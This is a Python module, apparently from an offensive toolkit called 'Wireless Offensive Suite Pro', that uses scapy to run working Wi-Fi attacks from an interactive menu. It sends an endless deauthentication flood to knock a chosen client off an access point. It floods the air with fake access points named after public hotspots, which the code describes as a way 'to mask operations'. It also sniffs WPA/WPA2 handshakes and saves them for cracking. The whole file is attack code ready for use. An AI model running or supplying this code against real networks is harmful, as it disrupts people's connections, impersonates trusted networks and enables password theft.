import time
import os
from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt, sendp, sniff, wrpcap, conf
from rich.console import Console
from core.ui import draw_header

console = Console()


class WiFiSuite:
    def deauth_attack(self, target_mac, bssid, iface):
        """Mimics 'aireplay-ng -0' for client disconnection."""
        pkt = RadioTap()/Dot11(addr1=target_mac, addr2=bssid,
                               addr3=bssid)/Dot11Deauth(reason=7)
        console.print(
            f"[bold red][!] Launching Deauth: {target_mac} <-> {bssid}[/bold red]")
        try:
            while True:
                sendp(pkt, iface=iface, count=64, inter=0.1, verbose=False)
        except KeyboardInterrupt:
            return

    def beacon_flood(self, iface):
        """Floods airwaves with fake APs to mask operations."""
        ssids = ["Free WiFi", "Starbucks_Guest",
                 "Airport_Public", "Xfinity_WiFi"]
        pkts = []
        for s in ssids:
            dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                          addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")
            beacon = Dot11Beacon(cap="ESS+privacy")
            essid = Dot11Elt(ID="SSID", info=s, len=len(s))
            pkts.append(RadioTap()/dot11/beacon/essid)

        console.print(
            "[bold red][!] Flooding Airwaves... (Ctrl+C to Stop)[/bold red]")
        try:
            while True:
                for p in pkts:
                    sendp(p, iface=iface, count=10, verbose=False)
        except KeyboardInterrupt:
            return

    def capture_handshake(self, iface, bssid):
        """Mimics 'airodump-ng' WPA handshake sniffing."""
        console.print(f"[*] Sniffing WPA/WPA2 Handshake for {bssid}...")
        pkts = sniff(iface=iface, timeout=60,
                     filter=f"ether src {bssid} or ether dst {bssid}")
        if pkts:
            fname = f"logs/handshake_{int(time.time())}.pcap"
            wrpcap(fname, pkts)
            console.print(
                f"[bold green][+] Handshake saved: {fname}[/bold green]")
        else:
            console.print("[red][!] No handshake captured.[/red]")

    def run(self):
        draw_header("Wireless Offensive Suite Pro")
        iface = console.input(
            "[bold yellow]Monitor Interface (wlan0mon): [/bold yellow]").strip()

        console.print(
            "\n[1] Deauth Client  [2] Capture Handshake  [3] Beacon Flood")
        choice = console.input("\n[wifi]> ")

        if choice == "1":
            target = console.input("Target Client MAC: ")
            bssid = console.input("Access Point BSSID: ")
            self.deauth_attack(target, bssid, iface)
        elif choice == "2":
            bssid = console.input("Target BSSID: ")
            self.capture_handshake(iface, bssid)
        elif choice == "3":
            self.beacon_flood(iface)


def run_wifi_suite():
    suite = WiFiSuite()
    suite.run()
